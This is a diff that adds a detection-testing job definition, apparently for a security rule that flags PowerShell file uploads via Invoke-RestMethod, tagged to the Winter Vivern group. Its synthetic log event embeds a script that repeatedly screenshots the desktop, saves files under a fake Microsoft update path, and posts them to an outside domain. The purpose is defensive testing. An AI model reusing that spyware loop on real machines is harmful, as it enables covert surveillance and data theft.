@@ -1,0 +1,64 @@
+type: job
+name: Windows Exfiltration Over C2 Via Invoke RestMethod
+detection:
+  source: escu
+  name: "ESCU - Windows Exfiltration Over C2 Via Invoke RestMethod - Rule"
+  id: 06ade821-f6fa-40d0-80af-15bc1d45b3ba
+description: |
+  Validates detection of a file upload over HTTP POST with
+  Invoke-RestMethod: PowerShell/Operational EID 4104 (Script Block Logging)
+  records a block that defines a function sending a file with
+  Invoke-RestMethod -Uri ... -Method Post -InFile to a remote URL, alongside
+  a screenshot function built on System.Drawing and a loop that saves a
+  screenshot to a file, uploads it and deletes it.
+tags: [winter-vivern]
+
+mitre:
+  tactics: [exfiltration]
+  techniques: [T1041]
+
+state:
+  domain_short:       CORP
+  domain_tld:         local
+  domain_short_lower: fn.lower(ref.domain_short)
+  domain_fqdn:        "${ref.domain_short_lower}.${ref.domain_tld}"
+  computer:           gen.hostname(class=windows-server, domain=ref.domain_fqdn)
+
+workloads:
+  - scenario: scenarios/windows/powershell/script-block/script-block-logged
+    bindings:
+      domain_short:      ref.domain_short
+      domain_tld:        ref.domain_tld
+      computer:          ref.computer
+      provider_guid:     "{A0C1853B-5C40-4B15-8766-3CF1C58F985A}"
+      script_block_text: "[Reflection.Assembly]::LoadWithPartialName('System.Drawing');\r\n\
+        \x20function screenshot([Drawing.Rectangle]$bounds, $path) \r\n\
+        \x20{\r\n\
+        \x20$bmp = New-Object Drawing.Bitmap $bound.width, $bound.height;\r\n\
+        \x20$graphics = [Drawing.Graphics]::FromImage($bmp);\r\n\
+        \x20$graphics.CopyFromScreen($bound.Location, [Drawing.Point]::Empty, $bound.size);\r\n\
+        \x20$bmp.Save($path);\r\n\
+        \x20$graphics.Dispose();\r\n\
+        \x20$bmp.Dispose()\r\n\
+        \x20};\r\n\
+        \x20$bounds = [Drawing.Rectangle]::FromLTRB(0,0,1900,1080);\r\n\
+        \x20function downloadFileUP($f){$name=$f.repalce(':\\','').replace('\\','/');\r\n\
+        \x20$valu=([System.Security.Principal.WindosIdentity]::GetCurrent()).User.Value;\r\n\
+        \x20$vu=$valu+$name;\r\n\
+        \x20Invoke-RestMethod -Uri 'https://wintervivern.com/screenshot.php' -Method Post -InFile $f -Headers@{'filename=$vu'} -UseDefaultCredentials};\r\n\
+        \x20$i=0;\r\n\
+        \x20while($true)\r\n\
+        \x20{\r\n\
+        \x20$i=$i+1;$f='c:\\Users\\Public\\MicrosoftUpdateClient\\Microsoft_Update_tool_'+$i+'.dat';\r\n\
+        \x20screenshot $bounds $f;\r\n\
+        \x20sleep 1;\r\n\
+        \x20downloadFileUP($f);\r\n\
+        \x20sleep 9;\r\n\
+        \x20remote-Item $f -Force\r\n\
+        \x20}\r\n"
+    expectation:
+      expected: alert
+      summary: "PowerShell logs a block that uploads files with Invoke-RestMethod -Method Post -InFile"
+      mitre:
+        tactics: [exfiltration]
+        techniques: [T1041]
